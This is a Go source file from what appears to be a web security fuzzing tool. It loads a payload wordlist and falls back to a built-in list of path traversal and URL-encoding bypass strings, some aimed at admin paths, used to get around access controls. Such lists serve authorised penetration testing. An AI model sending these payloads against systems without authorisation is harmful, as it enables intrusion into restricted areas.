package wordlist

import (
	"bufio"
	"fmt"
	"os"
)

// Load loads a wordlist from a file
func Load(path string) ([]string, error) {
	var payloads []string

	// Check if the file exists
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return nil, fmt.Errorf("wordlist file not found: %s", path)
	}

	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if line != "" {
			payloads = append(payloads, line)
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return payloads, nil
}

// GetDefaultPayloads returns a default list of payloads if the wordlist file is not available
func GetDefaultPayloads() []string {
	return []string{
		"/",
		"//",
		"/./",
		"/%2e/",
		"/%20",
		"/..;/",
		"/.././",
		"/;/",
		"/;foo=bar",
		"/./",
		"/.%2e/",
		"/%2e%2e/",
		"/%2e%2e%2f/",
		"/..%00/",
		"/..%01/",
		"/..//",
		"/..\\/",
		"/%5C../",
		"/%2e%2e\\/",
		"/..%255c",
		"/..%255c..%255c",
		"/..%5c..%5c",
		"/.%252e/",
		"/%252e/",
		"/..%c0%af",
		"/..%c1%9c",
		"/%%32%65",
		"/%%32%65/",
		"/..%bg%qf",
		"/..%u2215",
		"/..%u2216",
		"/..0x2f",
		"/0x2e0x2e/",
		"/..%c0%ae%c0%ae/",
		"/%%c0%ae%%c0%ae/",
		"/%%32%%65%%32%%65/",
		"/..",
		"/%2e%2e",
		"/.%2e",
		"/admin;/",
		"/admin/..;/",
		"/%2e%2e/admin",
		"/admin/...;/",
	}
}
